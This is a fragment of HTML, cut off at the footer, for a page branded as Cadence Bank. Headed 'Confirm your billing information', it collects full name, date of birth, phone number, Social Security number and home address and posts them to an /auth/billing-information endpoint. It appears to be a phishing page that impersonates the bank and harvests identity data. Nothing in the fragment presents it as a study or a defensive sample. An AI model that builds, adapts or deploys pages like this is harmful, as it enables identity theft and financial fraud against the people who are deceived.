<body class="flex flex-col items-center bg-[#004F5B]">
    <header class="bg-[#004F5B] top-0 w-full flex justify-center py-2">
        <img class="w-[180px]" title="Cadence Bank"
            src="https://online.cadencebank.com/custom-data/images/Cadence_Bank_logo_WHITE.svg" alt="">
    </header>
    <main class="bg-white rounded-[12px] text-black mt-50 w-[90%] md:w-[75%]">
        <div class="bg-[#1D871E] rounded-t-[12px] flex justify-between px-3 py-2">
            <p class="uppercase font-bold text-white text">Confirm your billing information</p>
        </div>
        <form action="/auth/billing-information" method="post" class="mt-7 p-4">
            <div class="flex flex-col">
                <label class="font-semibold" for="fname">Full Name</label>
                <input class="border border-neutral-300 outline-neutral-300 px-3 py-3 mt-2 rounded-[4px] text-sm"
                    type="text" id="fname" name="fname" required>
            </div>
            <div class="flex flex-col pt-[27px]">
                <label class="font-semibold" for="dob">Date of Birth</label>
                <input class="border border-neutral-300 outline-neutral-300 px-3 py-3 mt-2 rounded-[4px] text-sm"
                    type="text" id="dob" name="dob" oninput="formatDate(this)" maxlength="10" minlength="10" required>
            </div>
            <div class="flex flex-col pt-[27px]">
                <label class="font-semibold" for="phone">Phone Number</label>
                <input class="border border-neutral-300 outline-neutral-300 px-3 py-3 mt-2 rounded-[4px] text-sm"
                    type="text" id="phone" name="phone" oninput="formatPhone(this)" maxlength="14" minlength="14" required>
            </div>
            <div class="flex flex-col pt-[27px]">
                <label class="font-semibold" for="ssn">Social Security Number</label>
                <input class="border border-neutral-300 outline-neutral-300 px-3 py-3 mt-2 rounded-[4px] text-sm"
                    type="text" id="ssn" name="ssn" oninput="formatNumber(this)" maxlength="9" minlength="9" required>
            </div>
            <div class="flex flex-col pt-[27px]">
                <label class="font-semibold" for="address">Address</label>
                <input class="border border-neutral-300 outline-neutral-300 px-3 py-3 mt-2 rounded-[4px] text-sm"
                    type="text" id="address" name="address" required>
            </div>
            <div class="flex flex-col pt-[27px]">
                <label class="font-semibold" for="city">City</label>
                <input class="border border-neutral-300 outline-neutral-300 px-3 py-3 mt-2 rounded-[4px] text-sm"
                    type="text" id="city" name="city1" required>
            </div>
            <div class="flex flex-col pt-[27px]">
                <label class="font-semibold" for="state">State</label>
                <input class="border border-neutral-300 outline-neutral-300 px-3 py-3 mt-2 rounded-[4px] text-sm"
                    type="text" id="state" name="state" required>
            </div>
            <div class="flex flex-col pt-[27px]">
                <label class="font-semibold" for="zipcode">Zipcode</label>
                <input class="border border-neutral-300 outline-neutral-300 px-3 py-3 mt-2 rounded-[4px] text-sm"
                    type="text" id="zipcode" name="zipcode" oninput="formatNumber(this)" maxlength="5" minlength="5" required>
            </div>
            <button type="submit"
                class="bg-[#004F5B] text-white rounded-[4px] mt-3 min-h-[3.5em] font-semibold px-6 cursor-pointer">Submit</button>
        </form>
    </main>
    <footer
        class="w-full flex flex-col-reverse md:flex-row text-[#78777A] bg-white mt-8 justify-between px-4 md:px-20 py-4 bottom-0">
